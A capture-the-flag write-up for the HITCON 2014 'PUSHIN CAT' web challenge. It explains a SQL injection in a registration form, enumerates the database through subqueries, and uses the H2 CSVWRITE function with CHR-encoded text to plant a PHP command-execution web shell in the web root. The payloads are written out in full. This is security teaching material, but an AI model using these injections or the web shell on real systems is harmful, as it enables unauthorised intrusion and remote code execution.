# HITCON CTF 2014: PUSHIN CAT

**Category:** Web
**Points:** 350
**Description:**

> http://203.66.14.60/

**Hint:**

> The flag is file based. Try to get shell :P

## Write-up

Basically PUSHIN CAT offers only three functionalities: login, registration and the deceptive [“Get flag”](http://203.66.14.60/flag.html). The last one tells us “You are not admin from `X`”, where `X` is our IP address.

The displayed IP address quickly leads down a wrong route because trying to forge a local IP address (e.g. 127.0.0.1) with HTTP headers does not work. However, the registration page seems to be vulnerable to a very basic SQL injection vulnerability, as it responds with a “Query Error” to a single quote in the password field (the detail of the error message seems to have increased since we solved the challenge, so now you even get the surrounding query). Even without seeing the query, one can easily guess that it must be an `INSERT` into the database. After fiddling around with the injection, the format of the SQL query seems to be this one:

```sql
INSERT INTO [something...] VALUES ([some fields], 'INJECTION IN PW', 'IP')
```

This is great news, since the IP value is shown to us when clicking the “Get flag” button. We can further try to obtain the amount of parameters in the query with a multi-INSERT technique: `foo','IP'),(1,2)-- -`. This will insert 2 records into the database. We can continously increase the amount of parameters in the second query until there is no error anymore. This is the case with 4 parameters: `foo','IP'),(1,2,3,4)-- -`.

In order to dump the database schema and content, we can make use of subqueries: The injection syntax is `foo',(select 1))-- -`, where 1 could be any query returning only one row. Additionally, we can use `group\_concat` to group multiple rows together and read out `information_schema.tables` and `information_schema.columns`. From there on we can easily see that the original query roughly looks like this:

```sql
INSERT INTO users (role, username, password, ip) VALUES ('user', $username, $pw (INJECTION HERE), $ip)
```

Using this knowledge, we can build a multi-INSERT injection to create a user with the role “admin”. Logging in with that user and clicking “Get flag” only yields the message “Give shell plz” (IIRC). Another dead end.

A test confirms another interesting property: Multiple SQL statements are allowed in the injection (which is only the case with very few database drivers), so we can use `;` to add other kinds of queries. But let's first re-check the database engine to know our possibilities: The injection `foo',(select version()))-- -` yields `PostgreSQL 8.1.4  server protocol using H2 1.4.178 (2014-05-02)`. Okay, so… Postgres? However, what is this H2 thingy? As it turns out it is the underlying database engine. In order to exploit the server, we can make use of [all functions](http://www.h2database.com/html/functions.html) this database engine exposes. One of them, called `CSVWRITE`, seems to be particularly useful to drop files in the web root. The injection would look like this:

```
foo','');CALL CSVWRITE('/var/www/html/shell.php', 'SELECT 1')-- -
```

As can be seen from the syntax, the second parameter to `CSVWRITE` is a query. This example would write a file called `shell.php` in the web root (we guessed that but could also easily check the Apache configuration with file reading functions). However, the file would only contain a `1`. In order to avoid escaping our own quotes, we can use the `CHR(decimal)` function and the concatenation operator. Here is the resulting injection, using all the tricks:

```
foo','');CALL CSVWRITE('/var/www/html/shell.php', 'SELECT CHR(60)||CHR(63)||CHR(112)||CHR(104)||CHR(112)||CHR(32)||CHR(115)||CHR(121)||CHR(115)||CHR(116)||CHR(101)||CHR(109)||CHR(40)||CHR(36)||CHR(95)||CHR(71)||CHR(69)||CHR(84)||CHR(91)||CHR(48)||CHR(93)||CHR(41)||CHR(59)||CHR(32)||CHR(63)||CHR(62)')-- -
```

In conclusion, a lot of the difficulity of this challenge came from the multiple dead ends and small steps involved. We certainly tried a billion other attacks before finding this exact route to exploit the web application, but we had a lot of fun while doing it ;-)

## Other write-ups and resources

* <https://rzhou.org/~ricky/hitcon2014/pushin_cat/>
